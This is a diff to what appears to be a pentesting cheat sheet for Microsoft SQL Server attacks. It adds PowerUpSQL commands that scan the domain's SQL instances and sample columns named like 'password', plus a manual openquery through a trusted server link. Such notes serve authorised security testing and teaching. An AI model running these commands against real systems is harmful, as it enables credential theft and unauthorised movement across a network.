@@ -71,6 +71,10 @@ Get-SQLQuery -Instance "sql.domain.io,1433" -Query "select @@servername"
 
 #Dump an instance (a lotof CVSs generated in current dir)
 Invoke-SQLDumpInfo -Verbose -Instance "dcorp-mssql"
+
+# Search keywords in columns trying to access the MSSQL DBs
+## This won't use trusted SQL links
+Get-SQLInstanceDomain | Get-SQLConnectionTest | ? { $_.Status -eq "Accessible" } | Get-SQLColumnSampleDataThreaded -Keywords "password" -SampleSize 5 | select instance, database, column, sample | ft -autosize
 ```
 
 ### MSSQL xp\_dirtree abuse
@@ -142,6 +146,9 @@ Invoke-SQLAudit -Verbose -Instance "dcorp-mssql.dollarcorp.moneycorp.local"
 
 #Try to escalate privileges on an instance
 Invoke-SQLEscalatePriv –Verbose –Instance "SQLServer1\Instance1"
+
+#Manual trusted link queery
+Get-SQLQuery -Instance "sql.domain.io,1433" -Query "select * from openquery(""sql2.domain.io"", 'select * from information_schema.tables')"
 ```
 
 ### Metasploit
